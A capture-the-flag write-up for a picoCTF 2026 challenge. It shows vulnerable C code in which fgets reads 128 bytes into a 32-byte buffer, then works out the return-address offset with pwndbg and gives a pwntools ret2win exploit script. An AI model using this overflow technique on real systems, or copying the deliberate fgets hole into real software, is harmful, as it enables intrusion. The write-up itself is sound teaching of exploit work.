# Writeup: Echo Escape 2 - picoCTF 2026

**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Author:** YAHAYA MEDDY

## 1. Challenge Description

The developer learned from unsafe input functions and tried to secure the program by using `fgets()`. However, they used it incorrectly. Can you still find a way to read the flag?

![des](https://github.com/Writeup-Challenge-Le-Nam-Thang/Pwn-Picoctf/blob/02f5f50e34dfbffcf29d5980673ba6417c723cd7/des.png)

## 2. Downloading Files and Preparation

Download the source code and binary file provided in the challenge.

Use the `file ./filename` command to check the binary architecture and `checksec` to view the security protections.

![cauhinh](https://github.com/Writeup-Challenge-Le-Nam-Thang/Pwn-Picoctf/blob/02f5f50e34dfbffcf29d5980673ba6417c723cd7/file.png)

Great! After checking with `checksec`, we see that the binary has **no PIE** protection. This means the address of the `win()` function remains fixed every time the program runs.

Next, give execute permission to the binary: `chmod +x filename`

![local](https://github.com/Writeup-Challenge-Le-Nam-Thang/Pwn-Picoctf/blob/02f5f50e34dfbffcf29d5980673ba6417c723cd7/local.png)

You can test the program by connecting to the remote server using netcat:

 ![ketnoi](https://github.com/Writeup-Challenge-Le-Nam-Thang/Pwn-Picoctf/blob/02f5f50e34dfbffcf29d5980673ba6417c723cd7/netcat.png)

Or run it locally use ``./file``

![test](https://github.com/Writeup-Challenge-Le-Nam-Thang/Pwn-Picoctf/blob/02f5f50e34dfbffcf29d5980673ba6417c723cd7/test.png)

After running the program, it prints the line 'Enter the secret key:' we try entering any random string

![chay](https://github.com/Writeup-Challenge-Le-Nam-Thang/Pwn-Picoctf/blob/02f5f50e34dfbffcf29d5980673ba6417c723cd7/chay.png)

The program prints "you entered :," combined with the string you just entered.

## 3. Source Code Analysis

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
    FILE *fp = fopen("flag.txt", "r");
    if (!fp) {
        perror("[!] Could not open flag.txt");
        exit(1);
    }
    char flag[128];
    fgets(flag, sizeof(flag), fp);
    printf("Flag: %s\n", flag);
    fflush(stdout);
    fclose(fp);
}

void vuln() {
    char buf[32];
    printf("Enter the secret key: ");
    fflush(stdout);
    fgets(buf, 128, stdin);
    printf("You entered:, %s\n", buf);
}

int main() {
    vuln();
    puts("Goodbye!");
    return 0;
}
```
After reading and analyzing, we can see the sign of a buffer overflow vulnerability in the program.
Although fgets is considered safe because it has a character limit, here the programmer set the limit wrong

-The actual size of buf is 32.
The limit allowed by fgets is 128.

So what will happen when you enter more than 32 characters?

Characters 1 to 32: Fit neatly in the buf variable.
Characters 33 to 40 (around there): Will overwrite the Saved EBP.
The following characters: Will directly overwrite the Return Address.

## 4. Debug với pwndbg

We use pwndbg to find the offset and find the address of the win function  ```win```

![win](https://github.com/Writeup-Challenge-Le-Nam-Thang/Pwn-Picoctf/blob/02f5f50e34dfbffcf29d5980673ba6417c723cd7/win.png)

***The address of the win function here is: 0x8049276***


## 5. Finding Offset to Return Address

First, create a pattern that is longer than the program's allowed length, here I take 200 using the cyclic command

![cyclic](https://github.com/Writeup-Challenge-Le-Nam-Thang/Pwn-Picoctf/blob/02f5f50e34dfbffcf29d5980673ba6417c723cd7/cyclic.png)

Then run the program and fill in that pattern.

![vuln](https://github.com/Writeup-Challenge-Le-Nam-Thang/Pwn-Picoctf/blob/02f5f50e34dfbffcf29d5980673ba6417c723cd7/vuln.png)

We take the value of EIP to calculate the offset with the command ```cyclic -l EIP``` value. As you can see here it is `0x6161616c`

![a](https://github.com/Writeup-Challenge-Le-Nam-Thang/Pwn-Picoctf/blob/02f5f50e34dfbffcf29d5980673ba6417c723cd7/l.png)

***The offset we found is 44***

## 6. Writing the Exploit Script
Now comes the most exciting part, which is writing the payload to get the flag
```python
from pwn import *
p = remote("dolphin-cove.picoctf.net", PORT)
#p = process('./0vuln') # RUN LOCAL TEST
offset = 44
win_addr = 0x8049276
p.recvuntil('Enter the secret key: ')
payload = b"A" * offset + p32(win_addr)
p.sendline(payload)
p.interactive()
```
A little explanation about the payload:

``p.recvuntil('Enter the secret key: ')`` waits until the program shows the line 'Enter the secret key:' before starting to send the payload.

`payload = b"A" * offset + p32(win_addr)`

-`b"A"`: The letter 'A' written in byte form.

-`offset`: The exact number you calculated from GDB.

Purpose: This is the "junk" data used to fill the entire memory area from the buf variable, overwrite the EBP and stop right before the Return Address.
-`win_addr`: The memory address of the win() function we just found above.

-`p32()`: If you manually enter 0x08049276, the computer will misunderstand. The p32() function will automatically convert that number into the correct byte string that the CPU can read.

`p.sendline(payload)` is used to send the payload into the program.
## 7. Execute your payload file to get the flag

Now we just need to run the payload file and get the flag.

![flag](https://github.com/Writeup-Challenge-Le-Nam-Thang/Pwn-Picoctf/blob/02f5f50e34dfbffcf29d5980673ba6417c723cd7/flag.png)






